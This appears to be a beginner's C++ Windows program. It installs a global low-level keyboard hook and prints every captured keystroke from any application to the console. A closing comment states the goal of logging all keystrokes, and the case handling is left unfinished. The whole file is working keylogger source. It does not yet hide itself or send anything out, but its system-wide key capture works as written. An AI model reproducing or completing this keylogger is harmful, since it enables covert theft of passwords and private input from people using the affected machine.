#include <windows.h>
#include <iostream>

using namespace std;

HHOOK _hook_keyboard;
KBDLLHOOKSTRUCT kbdStruct;
string spclchars[] = {"!","@","#","$","%","^","&","*","(",")"};
bool shift = false;
int caps = 0;
LRESULT __stdcall HookCallbackKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        if(wParam == WM_KEYDOWN){

            char c = MapVirtualKey(kbdStruct.vkCode, 2);
            cout << "the key pressed was " << c << endl;
            cout << "i cannot distinguish between uppercase and lower case yet"<<endl;
            cout << "conditionals"<<endl;
            if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT){



            	if (caps && shift){
            	            	cout << "lower case is set"<<endl;
            	            	/*Hanlde lowwer case letters here*
            	            	 if lowercase then lower(keycode) need to find module or make one */
            	 }
            	 else {
            		 cout << "UPPER CASE SENSITIVE"<<endl;
            		 /*Leave default keycodes print caps*/
            	 }
            }


            else if (kbdStruct.vkCode == VK_CAPITAL ){

            	cout << caps<<endl;
            	if (caps ==1){
            		caps = 0;
            	    cout << "caps is off "<<endl;
            	}
            	else if(caps ==0){
            		caps = 1;
            		cout <<"caps is on "<<endl;
            	}


            }



        }
    }
    return CallNextHookEx(_hook_keyboard, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallbackKeyboard, NULL, 0)))
    {
        MessageBox(NULL, "Failed to install hook on keyboard!", "Error", MB_ICONERROR);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    SetHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}

/*Logs all keystrokes alphabet, numbers, special chars, lower and upper
 *
 * efficiency make a lower(dictionary)
 * for statement to print keycodes for alphabet and transfer to lower case then i would be less codej */
